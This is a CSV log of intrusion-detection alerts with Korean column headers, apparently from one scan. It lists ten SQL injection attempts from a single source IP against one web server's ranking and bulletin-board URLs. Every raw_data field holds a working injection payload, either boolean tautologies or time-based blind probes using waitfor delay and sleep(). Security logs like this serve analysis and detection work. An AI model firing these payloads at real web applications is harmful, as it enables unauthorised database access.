장비발생시간,출발지IP,목적지IP,목적지포트,공격명,raw_data
2019-03-13 10:05,203.246.171.140,139.150.87.138,80,SQL Injection, /world/tower/rank?cate=0&classCode=-1%20OR%202%2B665-665-1=0%2B0%2B0%2B1%20--%20&serverKey=3
2019-03-13 10:05,203.246.171.140,139.150.87.138,80,SQL Injection, /world/tower/rank?cate=0&classCode=-1%20OR%202%2B862-862-1=0%2B0%2B0%2B1&serverKey=3
2019-03-13 10:05,203.246.171.140,139.150.87.138,80,SQL Injection, /world/tower/rank?cate=0&classCode=gd%25'%20AND%202*3*8=6*8%20AND%20'VpSe'!='VpSe%25&serverKey=3
2019-03-13 10:05,203.246.171.140,139.150.87.138,80,SQL Injection, /world/tower/rank?cate=0&classCode=-1%20OR%203%2B665-665-1=0%2B0%2B0%2B1%20--%20&serverKey=3
2019-03-13 10:05,203.246.171.140,139.150.87.138,80,SQL Injection, /world/tower/rank?cate=0&classCode=-1%20OR%203%2B862-862-1=0%2B0%2B0%2B1&serverKey=3
2019-03-13 10:12,203.246.171.140,139.150.87.138,80,SQL Injection, /wwc-bbs/article/read?_=dwso09vs';%20waitfor%20delay%20'0:0:9'%20--%20&artSeq=the&ctgNo=T&ctgNo=icarus&searchText=1552434431767&searchType=1433327&svcId=14
2019-03-13 10:14,203.246.171.140,139.150.87.138,80,SQL Injection," /wwc-bbs/article/list?_=114&ctgNo=the&ctgNo=T&searchText=0""XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR""Z&searchType=1552432819469&svcId=114"
2019-03-13 10:14,203.246.171.140,139.150.87.138,80,SQL Injection," /wwc-bbs/article/list?_=114&ctgNo=the&ctgNo=T&searchText=(select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'""%2B(select(0)from(select(sleep(6)))v)%2B""*/&searchType=1552432819469&svcId=114"
2019-03-13 10:15,203.246.171.140,139.150.87.138,80,SQL Injection, /wwc-bbs/article/list?_=114&ctgNo=the&ctgNo=T&searchText=hkzZoIY2';%20waitfor%20delay%20'0:0:3'%20--%20&searchType=1552432819469&svcId=114
2019-03-13 10:14,203.246.171.140,139.150.87.138,80,SQL Injection, /world/tower/rank?cate=0'XOR(if(now()=sysdate()%2Csleep(3)%2C0))XOR'Z&classCode=tf&serverKey=1
